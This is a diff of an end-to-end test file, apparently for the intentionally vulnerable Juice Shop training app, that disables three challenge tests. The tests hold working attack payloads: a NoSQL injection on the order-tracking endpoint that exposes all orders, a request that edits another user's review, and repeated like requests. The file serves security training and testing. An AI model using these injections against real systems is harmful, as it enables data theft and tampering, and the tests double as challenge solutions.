@@ -31,13 +31,13 @@ describe('/rest/product/reviews', () => {
   })
 
   describe('challenge "NoSql Orders Injection"', () => {
-    it('should be possible to inject and get all the orders', () => {
+    xit('should be possible to inject and get all the orders', () => {
       browser.waitForAngularEnabled(false)
       browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.get(\'/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27\');')
       browser.driver.sleep(1000)
       browser.waitForAngularEnabled(true)
     })
-    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 3' })
+    // protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 3' })
   })
 
   describe('challenge "Forged Review"', () => {
@@ -60,13 +60,13 @@ describe('/rest/product/reviews', () => {
       })
     })
 
-    it('should be possible to edit any existing review', () => {
+    xit('should be possible to edit any existing review', () => {
       browser.waitForAngularEnabled(false)
       browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": "' + reviewId + '", "message": "injected" });')
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
-    protractor.expect.challengeSolved({ challenge: 'Forged Review' })
+    // protractor.expect.challengeSolved({ challenge: 'Forged Review' })
   })
 
   describe('challenge "Multiple Likes"', () => {
@@ -89,12 +89,12 @@ describe('/rest/product/reviews', () => {
       })
     })
 
-    it('should be possible to like reviews multiple times', () => {
+    xit('should be possible to like reviews multiple times', () => {
       browser.waitForAngularEnabled(false)
       browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.post(\'/rest/product/reviews\', { "id": "' + reviewId + '" }); $http.post(\'/rest/product/reviews\', { "id": "' + reviewId + '" });')
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
-    protractor.expect.challengeSolved({ challenge: 'Multiple Likes' })
+    // protractor.expect.challengeSolved({ challenge: 'Multiple Likes' })
   })
 })
